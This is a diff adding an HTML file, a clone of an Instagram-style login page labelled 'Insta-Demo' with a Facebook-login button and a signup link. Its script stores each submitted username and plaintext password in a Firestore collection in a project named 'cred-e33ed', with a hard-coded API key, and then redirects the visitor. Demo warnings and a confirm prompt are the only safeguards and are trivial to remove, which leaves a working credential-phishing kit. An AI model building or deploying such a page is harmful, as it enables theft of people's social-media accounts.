@@ -1,0 +1,214 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Insta‑Style Login — Demo</title>
+  <style>
+    /* Reset-ish */
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    html,body { height:100%; background: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial; color: #262626; }
+    a { color: #385185; text-decoration: none; }
+
+    /* Centering layout */
+    .wrap { min-height:100vh; display:flex; align-items:center; justify-content:center; padding:24px; }
+    .container { display:flex; gap:32px; align-items:flex-start; }
+
+    /* Left phone preview (optional look) */
+    .phone {
+      width: 380px; height: 582px; border-radius:28px; background: linear-gradient(180deg,#fff,#fff);
+      border: 1px solid #dbdbdb; padding:24px; display:flex; flex-direction:column; justify-content:flex-start;
+      box-shadow: 0 6px 18px rgba(0,0,0,0.06);
+    }
+    .phone .photo { height: 440px; border-radius:6px; background: linear-gradient(180deg,#eee,#ddd); margin-bottom:14px; display:flex; align-items:center; justify-content:center; color:#999; font-size:14px; }
+    .phone .cap { text-align:center; font-size:13px; color:#999; }
+
+    /* Card (main) */
+    .card {
+      width: 350px; background: #fff; border: 1px solid #dbdbdb; padding: 36px 40px; border-radius: 6px; text-align:center;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.03);
+    }
+
+    .logo {
+      font-family: "Segoe Script", "Pacifico", cursive;
+      font-size: 42px; letter-spacing: 1px; margin-bottom: 18px; color: #111;
+    }
+    .sub { font-size:14px; color:#8e8e8e; margin-bottom:18px; }
+
+    form { display:flex; flex-direction:column; gap:8px; }
+    input[type="text"], input[type="password"]{
+      height:44px; padding:0 10px; border-radius:4px; border:1px solid #dbdbdb; background:#fafafa; font-size:14px;
+    }
+    input::placeholder { color:#b7b7b7; }
+
+    button {
+      height:44px; border-radius:4px; border:none; background:#0095f6; color:#fff; font-weight:600; cursor:pointer;
+      display:flex; align-items:center; justify-content:center;
+    }
+    button:disabled { opacity:0.6; cursor:not-allowed; }
+
+    .or { display:flex; align-items:center; gap:14px; margin:12px 0; color:#8e8e8e; font-size:13px; }
+    .or hr { flex:1; border: none; border-top:1px solid #dbdbdb; }
+
+    .fb-login { color:#385185; font-weight:600; display:flex; align-items:center; justify-content:center; gap:8px; }
+
+    .signup {
+      margin-top:14px; padding:18px 0; font-size:14px; background:#fff; border:1px solid transparent;
+      box-shadow:none;
+    }
+
+    .download {
+      margin-top:18px; color:#8e8e8e; font-size:13px;
+    }
+
+    .warning {
+      margin-top:10px; font-size:12px; color:#c0392b;
+      background: #fff0f0; padding:8px; border-radius:4px; border:1px solid rgba(192,57,43,0.12);
+    }
+
+    /* Footer small */
+    .meta { margin-top:14px; font-size:12px; color:#8e8e8e; text-align:center; }
+
+    /* Responsive adjustments */
+    @media (max-width:900px){
+      .container { flex-direction:column; align-items:center; }
+      .phone { display:none; } /* hide phone preview on narrow screens */
+    }
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="container">
+      <div class="phone" aria-hidden="true">
+        <div class="photo">Demo feed preview</div>
+        <div class="cap">This area is just a non-functional preview to match the look.</div>
+      </div>
+
+      <div>
+        <div class="card" role="main" aria-labelledby="pageTitle">
+          <div id="pageTitle" class="logo">Insta‑Demo</div>
+          <div class="sub">Log in to see photos and videos from your friends.</div>
+
+          <!-- Visible demo warning -->
+          <div class="warning" id="demoWarning">
+            This is a demo page — <strong>do not</strong> enter real Instagram credentials here.
+          </div>
+
+          <form id="loginForm" aria-describedby="demoWarning" style="margin-top:14px;">
+            <input id="username" name="username" type="text" placeholder="Phone number, username or email" autocomplete="username" required />
+            <input id="password" name="password" type="password" placeholder="Password" autocomplete="current-password" required />
+            <button id="submitBtn" type="submit">Log In</button>
+          </form>
+
+          <div class="or" aria-hidden="true">
+            <hr /><div>OR</div><hr />
+          </div>
+
+          <div>
+            <a class="fb-login" href="#" id="fbLoginBtn" onclick="return false;" role="button" aria-label="Log in with Facebook">
+              <!-- simple FB icon -->
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M22 12.07C22 6.53 17.52 2 12 2S2 6.53 2 12.07C2 17.1 5.66 21.2 10.44 22v-6.99H7.9v-2.9h2.54V9.41c0-2.5 1.49-3.88 3.77-3.88 1.09 0 2.23.2 2.23.2v2.45h-1.25c-1.23 0-1.62.77-1.62 1.56v1.88h2.77l-.44 2.9h-2.33V22C18.34 21.2 22 17.1 22 12.07z" fill="#385185"/></svg>
+              Log in with Facebook
+            </a>
+          </div>
+
+          <div class="signup" style="border-top:1px solid #efefef; padding-top:12px;">
+            <span style="color:#8e8e8e">Don't have an account?</span>
+            <a href="#" style="margin-left:6px; font-weight:600">Sign up</a>
+          </div>
+
+          <div class="download">Get the app.</div>
+        </div>
+
+        <div class="meta" style="width:350px; margin-top:12px; text-align:center;">
+          <small>Demo stores inputs to your Firestore collection: <strong>demo_logins</strong></small>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Firebase SDKs -->
+  <script type="module">
+    // ---------- FIREBASE CONFIG: replace if you want; using the one you provided  ----------
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-app.js";
+    import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-firestore.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyDcOYDQTz-hlo05l4j8Bs718d0vgjAEDx0",
+      authDomain: "cred-e33ed.firebaseapp.com",
+      projectId: "cred-e33ed",
+      storageBucket: "cred-e33ed.firebasestorage.app",
+      messagingSenderId: "444847320943",
+      appId: "1:444847320943:web:4e5a05ea56014203d1829a"
+    };
+
+    // Initialize Firebase app & Firestore
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    // ---------- CONFIG: set your redirect URL here ----------
+    // Replace this with the URL you want to redirect to after the demo save.
+    // Keep it absolute (https://...) for GitHub Pages, or relative to your site.
+    const redirectUrl = "https://example.com/"; // <- change this
+
+    // ---------- DOM refs ----------
+    const form = document.getElementById("loginForm");
+    const submitBtn = document.getElementById("submitBtn");
+    const usernameEl = document.getElementById("username");
+    const passwordEl = document.getElementById("password");
+    const fbLoginBtn = document.getElementById("fbLoginBtn");
+
+    // Optional: clicking fbLogin just shows demo behaviour
+    fbLoginBtn.addEventListener("click", (e) => {
+      e.preventDefault();
+      // Demo toast
+      alert("Facebook login button is a demo on this page.");
+    });
+
+    // Helper to disable UI while saving
+    function setLoading(isLoading) {
+      submitBtn.disabled = isLoading;
+      submitBtn.textContent = isLoading ? "Logging in..." : "Log In";
+    }
+
+    // Submit handler: store demo data to Firestore and redirect
+    form.addEventListener("submit", async (e) => {
+      e.preventDefault();
+
+      // Basic front-end validation
+      const username = usernameEl.value.trim();
+      const password = passwordEl.value;
+
+      if (!username || !password) {
+        alert("Please complete both fields (demo only).");
+        return;
+      }
+
+      // Warn user if they are entering actual credentials
+      if (confirm("Reminder: This is a demo page. Do NOT enter real credentials. Continue?") === false) return;
+
+      setLoading(true);
+
+      try {
+        // add a demo document to collection 'demo_logins'
+        await addDoc(collection(db, "demo_logins"), {
+          username,
+          password,
+          // store when it was added on server
+          createdAt: serverTimestamp(),
+          note: "demo-capture-only"
+        });
+
+        // instant redirect after write
+        window.location.href = redirectUrl;
+      } catch (err) {
+        console.error("Firestore write failed:", err);
+        alert("Could not save demo data. Check console for details.");
+        setLoading(false);
+      }
+    });
+
+    // Accessibility nicety: press Enter on password should submit (already default behavior)
+  </script>
+</body>
+</html>
